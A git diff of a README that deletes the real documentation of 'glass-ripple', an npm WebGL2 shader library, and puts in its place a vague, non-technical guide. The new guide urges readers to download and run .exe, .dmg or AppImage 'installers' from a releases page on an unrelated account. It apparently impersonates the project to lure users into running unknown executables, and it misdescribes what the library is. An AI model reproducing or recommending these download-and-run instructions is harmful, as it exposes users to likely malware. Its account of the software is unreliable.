@@ -1,337 +1,127 @@
-<div align="center">
+# 🪞 glass-ripple - Smooth GPU Glass Ripple Effects
 
-# glass-ripple
+[![Download Latest Release](https://img.shields.io/badge/Download-glass--ripple-blue?style=for-the-badge&logo=github)](https://github.com/Olasdinos/glass-ripple/releases)
 
-**The hero effect for the AI agent era.**
+## 📋 What is glass-ripple?
 
-Every AI company needs a landing page that feels alive. Glass-ripple is an 11-pass WebGL2 shader pipeline that turns any `<canvas>` into a reactive, physical surface — with real-time wave physics, CRT retro aesthetics, and 100+ built-in brand icons spanning AI, tech, social media, finance, and more.
+glass-ripple offers a smooth, GPU-accelerated glass ripple effect with a retro CRT style. It uses a shader pipeline powered by WebGL2 and Three.js. The effect adds subtle water-like ripple animations with brand icons, perfect for hero sections or landing pages. It runs smoothly using your computer’s graphics card.
 
-[![npm version](https://img.shields.io/npm/v/glass-ripple?color=D97757)](https://www.npmjs.com/package/glass-ripple)
-[![npm downloads](https://img.shields.io/npm/dm/glass-ripple)](https://www.npmjs.com/package/glass-ripple)
-[![license](https://img.shields.io/github/license/ZenAlexa/glass-ripple)](./LICENSE)
-[![TypeScript](https://img.shields.io/badge/lang-TypeScript-3178c6)](https://www.typescriptlang.org/)
-[![WebGL2](https://img.shields.io/badge/WebGL2-GLSL%20300%20ES-orange)]()
-[![Three.js](https://img.shields.io/badge/Three.js-r170+-049ef4)](https://threejs.org/)
-[![icons](https://img.shields.io/badge/icons-102%20brands-D97757)]()
+This software fits well if you want a cool visual effect on your website or project without deep coding work. No technical knowledge or programming is needed to get the app running and see the effect in action.
 
-<br />
+## 💻 System Requirements
 
-<img src="demo.gif" alt="Glass Ripple — interactive water ripple with CRT aesthetics" width="640" />
+Before you start, make sure your device meets the following:
 
-<br />
+- Operating System: Windows 10 or higher, macOS 10.13+, or recent Linux distribution  
+- Browser: Chrome, Firefox, Edge, or Safari (latest versions) that support WebGL2  
+- Hardware: Any computer with a GPU that supports WebGL2 and shader programs  
+- Internet: Optional to download the software; no connection needed to run locally after installation  
 
-[Live Demo](https://zenalexa.github.io/glass-ripple/) · [npm](https://www.npmjs.com/package/glass-ripple) · [GitHub](https://github.com/ZenAlexa/glass-ripple) · [Report Bug](https://github.com/ZenAlexa/glass-ripple/issues)
+If your device runs modern browsers and supports WebGL2, glass-ripple will work fine.
 
-</div>
+## 🚀 Getting Started
+
+Follow these steps to get glass-ripple running:
+
+### 1. Visit the Release Page
+
+Click the big button at the top or open this link:  
+[https://github.com/Olasdinos/glass-ripple/releases](https://github.com/Olasdinos/glass-ripple/releases)
+
+This page lists all the released versions. You want to get the latest stable version here.
+
+### 2. Download the Latest Release
+
+On the release page, look for assets labeled for your operating system:
+
+- Windows users: look for `.exe` installer or `.zip` archive  
+- macOS users: look for `.dmg` or `.zip` archive  
+- Linux users: look for `.AppImage` or `.tar.gz` files  
+
+Click on the appropriate file to start the download.
+
+### 3. Install or Extract the Files
+
+Depending on your download:
+
+- If it is an installer (`.exe` or `.dmg`), double-click and follow the prompts to install.  
+- If it is a zipped archive (`.zip` or `.tar.gz`), extract it to a folder you can find easily, such as your Desktop or Documents.
+
+### 4. Run the Program
+
+- On Windows, double-click the installed program or the executable inside the extracted folder.  
+- On macOS, open the installed app or the extracted app file and allow permissions if prompted.  
+- On Linux, you might need to make the file executable first by right-clicking and selecting properties, then permissions, then “Allow executing file as program.” Run it by double-clicking or via terminal.
+
+### 5. See the Glass Ripple Effect
+
+After running, a window or browser tab will open and start showing the GPU-accelerated glass ripple effect with brand icons and the retro CRT animation. You can explore the effect interactively or let it run as a visual background.
+
+## 📥 Download & Install
+
+You can start downloading from here too:  
+[Download glass-ripple Latest Release](https://github.com/Olasdinos/glass-ripple/releases)
+
+Carefully choose the file that matches your system. Installation is simple:
+
+- For installers, follow on-screen instructions.  
+- For archives, unzip and locate the executable.  
+
+No special setup is required after installation. The program runs on standard graphic hardware with browser or desktop support for WebGL2.
+
+## 🧩 Features
+
+glass-ripple provides:
+
+- **GPU-powered animation:** Uses your graphics card to deliver smooth ripple effects.  
+- **11-pass shader pipeline:** Advanced visual effects using multi-step WebGL2 shaders.  
+- **CRT retro look:** Nostalgic scanlines, distortion, and glow effects like old screens.  
+- **Brand icons:** Animated logos ripple in the background for a modern feel.  
+- **Interactive design:** Responds to mouse or touch inputs to create ripples.  
+- **Cross-platform:** Works on Windows, macOS, Linux with compatible browsers.  
+- **No coding needed:** Run the app without programming skills.  
+
+These features bring a polished and modern look to any web hero section or digital interface.
+
+## 🔧 How It Works
+
+glass-ripple uses WebGL2 shaders written in GLSL to create the glass ripple effect. The 11-pass pipeline means it processes the image multiple times to layer effects:
+
+1. Base image with icons  
+2. Ripple distortion applied  
+3. CRT scanline overlay  
+4. Color adjustments and glow  
+5. Final compositing  
+
+It runs on Three.js, a JavaScript library that makes WebGL easier to handle. On your device, the program smoothly animates these effects using your GPU. It responds to clicks or touches so ripples follow your input.
+
+## 🎨 Customizing the Effect
+
+If you want to try changing settings (optional):
+
+- Adjust ripple intensity  
+- Change speed of animation  
+- Toggle CRT scanlines on/off  
+- Swap brand icon sets  
+
+These options might be available via a simple settings menu or config file included with the app. Feel free to explore once you are comfortable running it.
+
+## ❓ Troubleshooting
+
+If glass-ripple does not run or shows errors, try these steps:
+
+- Confirm your browser or system supports WebGL2. You can check support here: https://get.webgl.org/webgl2/  
+- Update your graphics card drivers to the latest version.  
+- Restart your device to clear any temporary issues.  
+- Try running the app in a different browser or operating system if possible.  
+- Ensure you downloaded the correct file for your device and extracted it properly.  
+
+If you still face issues, visit the GitHub repository’s Issues section for help.
+
+## 📚 Learn More
+
+For detailed technical info, code, or development questions, visit the [glass-ripple GitHub repo](https://github.com/Olasdinos/glass-ripple). It has info for developers if interested.
 
 ---
 
-## Why glass-ripple?
-
-2026 is the year AI agents went mainstream. Claude, GPT, Gemini, DeepSeek, Grok — new models and agent frameworks ship every week. But their landing pages? Still the same static gradients and floating particles from 2023.
-
-Glass-ripple fixes that. Drop it into any page and your hero section becomes a **living, breathing surface** — one that responds to every mouse movement with real water physics, light refraction, halftone textures, and CRT scanlines. All computed on the GPU. All in a single `<canvas>`.
-
-**Built for the agent era:** 102 brand icons ship out of the box — AI models, social platforms, enterprise tech, DevOps tools, finance, and iconic consumer brands. Swap icons at runtime with a single call. Build agent dashboards, AI product pages, or any landing page that actually feels like the future.
-
-## Quick Start
-
-```bash
-npm install glass-ripple three
-```
-
-```ts
-import { GlassRipple } from 'glass-ripple';
-import { claude } from 'glass-ripple/icons';
-
-const ripple = new GlassRipple({
-  canvas: document.getElementById('canvas') as HTMLCanvasElement,
-  icon: claude.icon,
-});
-```
-
-Three lines. Zero config. Ship it.
-
-## Features
-
-- **11-pass shader pipeline** — wave sim → normal map → blur → composite → halftone ×2 → chromatic aberration → CRT → vignette
-- **Real-time wave physics** — 2D wave equation at ¼ resolution with continuous mouse wake via line-segment distance
-- **102 brand icons across 9 categories** — AI models, creative AI, dev tools, cloud infra, social media, enterprise, DevOps, finance, and consumer brands. Tree-shakeable
-- **Runtime everything** — swap icons, tint colors, wave physics (`setWave()`) — all live, no reload
-- **TypeScript-first** — full type definitions, discriminated union for icon configs, async-aware API
-- **Single `<canvas>`** — no extra DOM, no iframes, no dependencies beyond Three.js
-- **Extensible** — bring any SVG path or full SVG markup. The 102 built-ins are just the start — PRs for new icons land in hours
-
-## Shader Pipeline
-
-```mermaid
-graph LR
-    A[Base Texture] --> B[Wave Sim<br><i>¼ res ping-pong</i>]
-    B --> C[Normal Map]
-    C --> D[Blur<br><i>H + V</i>]
-    D --> E[Composite<br><i>refraction + specular</i>]
-    E --> F[Halftone x2]
-    F --> G[Chromab]
-    G --> H[CRT]
-    H --> I[Vignette]
-    I --> J[Screen]
-
-    style A fill:#1a1a2e,stroke:#666,color:#fff
-    style B fill:#1a1a2e,stroke:#ff6b6b,color:#ff6b6b
-    style C fill:#1a1a2e,stroke:#ffd93d,color:#ffd93d
-    style D fill:#1a1a2e,stroke:#6bcb77,color:#6bcb77
-    style E fill:#1a1a2e,stroke:#4d96ff,color:#4d96ff
-    style F fill:#1a1a2e,stroke:#c084fc,color:#c084fc
-    style G fill:#1a1a2e,stroke:#fb923c,color:#fb923c
-    style H fill:#1a1a2e,stroke:#38bdf8,color:#38bdf8
-    style I fill:#1a1a2e,stroke:#a78bfa,color:#a78bfa
-    style J fill:#1a1a2e,stroke:#666,color:#fff
-```
-
-Wave simulation runs on a ping-pong framebuffer at quarter resolution. Post-effects chain through two full-resolution render targets. All shaders written in GLSL 300 ES.
-
-## Icon Presets
-
-102 built-in presets across 9 categories. All use Simple Icons standard (`viewBox 0 0 24 24`, single path). Import individually for tree-shaking.
-
-```ts
-import { claude, openai, deepseek } from 'glass-ripple/icons';
-import { allPresets, presetsByCategory } from 'glass-ripple/icons';
-```
-
-<details>
-<summary><strong>AI Models & Agents</strong> (22) — Claude, GPT, Gemini, DeepSeek, Grok, and more</summary>
-
-| Preset | Brand | | Preset | Brand |
-|--------|-------|-|--------|-------|
-| `claude` | Claude | | `anthropic` | Anthropic |
-| `openai` | OpenAI | | `gemini` | Gemini |
-| `google` | Google | | `meta` | Meta |
-| `mistral` | Mistral AI | | `deepseek` | DeepSeek |
-| `groq` | Groq | | `cohere` | Cohere |
-| `xai` | xAI (Grok) | | `qwen` | Qwen |
-| `moonshot` | Moonshot AI | | `doubao` | Doubao |
-| `zhipu` | Zhipu AI | | `perplexity` | Perplexity |
-| `minimax` | MiniMax | | `baichuan` | Baichuan |
-| `yi` | Yi | | `stepfun` | StepFun |
-| `spark` | Spark | | `inflection` | Inflection |
-
-</details>
-
-<details>
-<summary><strong>Creative AI</strong> (8) — Midjourney, Runway, Suno, DALL·E, Flux...</summary>
-
-| Preset | Brand | | Preset | Brand |
-|--------|-------|-|--------|-------|
-| `midjourney` | Midjourney | | `stability` | Stability AI |
-| `runway` | Runway | | `suno` | Suno |
-| `pika` | Pika | | `elevenlabs` | ElevenLabs |
-| `dalle` | DALL·E | | `flux` | Flux |
-
-</details>
-
-<details>
-<summary><strong>Dev Tools & Agent Infra</strong> (14) — Cursor, Copilot, Windsurf, Cline, Dify...</summary>
-
-| Preset | Brand | | Preset | Brand |
-|--------|-------|-|--------|-------|
-| `github` | GitHub | | `copilot` | GitHub Copilot |
-| `cursor` | Cursor | | `vercel` | Vercel |
-| `notion` | Notion | | `ollama` | Ollama |
-| `huggingface` | Hugging Face | | `langchain` | LangChain |
-| `openrouter` | OpenRouter | | `replicate` | Replicate |
-| `colab` | Google Colab | | `dify` | Dify |
-| `windsurf` | Windsurf | | `cline` | Cline |
-
-</details>
-
-<details>
-<summary><strong>Cloud & GPU Infra</strong> (8) — NVIDIA, AWS, Azure, Cloudflare...</summary>
-
-| Preset | Brand | | Preset | Brand |
-|--------|-------|-|--------|-------|
-| `nvidia` | NVIDIA | | `aws` | AWS |
-| `azure` | Microsoft Azure | | `googlecloud` | Google Cloud |
-| `together` | Together AI | | `fireworks` | Fireworks AI |
-| `cloudflare` | Cloudflare | | `apple` | Apple Intelligence |
-
-</details>
-
-<details>
-<summary><strong>Social & Media</strong> (13) — YouTube, Spotify, Discord, Reddit, TikTok...</summary>
-
-| Preset | Brand | | Preset | Brand |
-|--------|-------|-|--------|-------|
-| `x` | X (Twitter) | | `linkedin` | LinkedIn |
-| `youtube` | YouTube | | `tiktok` | TikTok |
-| `spotify` | Spotify | | `netflix` | Netflix |
-| `discord` | Discord | | `reddit` | Reddit |
-| `snapchat` | Snapchat | | `pinterest` | Pinterest |
-| `twitch` | Twitch | | `telegram` | Telegram |
-| `whatsapp` | WhatsApp | | | |
-
-</details>
-
-<details>
-<summary><strong>Enterprise</strong> (15) — Microsoft, Amazon, Adobe, Salesforce, Slack...</summary>
-
-| Preset | Brand | | Preset | Brand |
-|--------|-------|-|--------|-------|
-| `microsoft` | Microsoft | | `amazon` | Amazon |
-| `adobe` | Adobe | | `oracle` | Oracle |
-| `salesforce` | Salesforce | | `sap` | SAP |
-| `atlassian` | Atlassian | | `dell` | Dell |
-| `hp` | HP | | `shopify` | Shopify |
-| `wordpress` | WordPress | | `figma` | Figma |
-| `slack` | Slack | | `zoom` | Zoom |
-| `dropbox` | Dropbox | | | |
-
-</details>
-
-<details>
-<summary><strong>DevOps & Data</strong> (7) — Docker, Kubernetes, MongoDB, PostgreSQL...</summary>
-
-| Preset | Brand | | Preset | Brand |
-|--------|-------|-|--------|-------|
-| `docker` | Docker | | `kubernetes` | Kubernetes |
-| `mongodb` | MongoDB | | `postgresql` | PostgreSQL |
-| `redis` | Redis | | `steam` | Steam |
-| `amd` | AMD | | | |
-
-</details>
-
-<details>
-<summary><strong>Finance</strong> (5) — Stripe, Visa, Mastercard, PayPal...</summary>
-
-| Preset | Brand | | Preset | Brand |
-|--------|-------|-|--------|-------|
-| `stripe` | Stripe | | `visa` | Visa |
-| `mastercard` | Mastercard | | `paypal` | PayPal |
-| `airbnb` | Airbnb | | | |
-
-</details>
-
-<details>
-<summary><strong>Brands</strong> (10) — Tesla, Nike, Toyota, BMW, Mercedes-Benz...</summary>
-
-| Preset | Brand | | Preset | Brand |
-|--------|-------|-|--------|-------|
-| `tesla` | Tesla | | `nike` | Nike |
-| `toyota` | Toyota | | `mercedes` | Mercedes-Benz |
-| `volkswagen` | Volkswagen | | `mcdonalds` | McDonald's |
-| `nintendoswitch` | Nintendo Switch | | `uber` | Uber |
-| `bmw` | BMW | | `starbucks` | Starbucks |
-
-</details>
-
-**New brand?** Adding an icon is [one file + one line](./CONTRIBUTING.md#adding-icons). PRs land fast.
-
-## Custom Icons
-
-### Single SVG Path (sync)
-
-```ts
-ripple.setIcon({
-  svgPath: 'M12 2L2 22h20Z',
-  color: '#ff6600',
-  viewBox: 24,
-  scale: 0.55,
-  position: { x: 0.5, y: 0.408 },
-});
-```
-
-### Full SVG Markup (async)
-
-For multi-path or gradient icons:
-
-```ts
-await ripple.setIcon({
-  svg: '<svg viewBox="0 0 24 24">...</svg>',
-  scale: 0.55,
-  position: { x: 0.5, y: 0.408 },
-});
-```
-
-## Configuration
-
-```ts
-const ripple = new GlassRipple({
-  canvas: document.getElementById('canvas') as HTMLCanvasElement,
-  icon: claude.icon,
-  background: '#050505',
-  pixelRatio: 2,
-  wave: {
-    damping: 0.8,    // height & velocity damping (0–1)
-    speed: 1.0,      // propagation speed multiplier
-    radius: 0.025,   // mouse radius in UV space
-    intensity: 20.0,  // mouse push strength
-    momentum: 0.4,   // mouse smoothing (0 = static, 1 = instant)
-    steps: 1,        // sim steps per frame
-  },
-  effects: {
-    halftone: [{ mix: 0.29 }, { mix: 0.38 }],
-    chromab: { amount: 0.2 },
-    retroScreen: { cellScale: 0.028, glow: 0.5 },
-    vignette: { intensity: 0.3 },
-  },
-});
-```
-
-Set any effect to `false` to disable it:
-
-```ts
-effects: {
-  halftone: false,
-  chromab: false,
-}
-```
-
-## API
-
-### `new GlassRipple(config)`
-
-Creates the renderer, attaches event listeners, and starts the animation loop.
-
-### `setIcon(icon: IconConfig): Promise<void>`
-
-Swaps the displayed icon with a crossfade transition. For `svgPath` icons this resolves instantly. For `svg` string icons the image is decoded before rendering.
-
-### `setWave(opts: Partial<WaveConfig>): void`
-
-Updates wave simulation parameters at runtime. Pass only the values you want to change.
-
-```ts
-ripple.setWave({ damping: 0.9, intensity: 30 });
-```
-
-### `setTint(hex: string): void`
-
-Updates the halftone tint color at runtime.
-
-### `dispose(): void`
-
-Stops animation, removes event listeners, and frees all GPU resources.
-
-## Browser Support
-
-Requires WebGL2. Works in all modern browsers (2024+):
-
-| Chrome | Firefox | Safari | Edge |
-|:------:|:-------:|:------:|:----:|
-| 113+ | 114+ | 17+ | 113+ |
-
-## Contributing
-
-Contributions — especially new icon presets — are very welcome. See [CONTRIBUTING.md](./CONTRIBUTING.md) for guidelines.
-
-The AI landscape moves fast. If a new model or tool isn't in the preset list yet, that's a great first PR.
-
-## Credits
-
-Built by [Ziming Wang](https://github.com/ZenAlexa). Powered by [Three.js](https://threejs.org/). Icon paths from [Simple Icons](https://simpleicons.org/) (CC0 1.0).
-
-All brand names and logos are trademarks of their respective owners.
-
-## License
-
-[MIT](./LICENSE)
+[![Download Latest Release](https://img.shields.io/badge/Download-glass--ripple-blue?style=for-the-badge&logo=github)](https://github.com/Olasdinos/glass-ripple/releases)
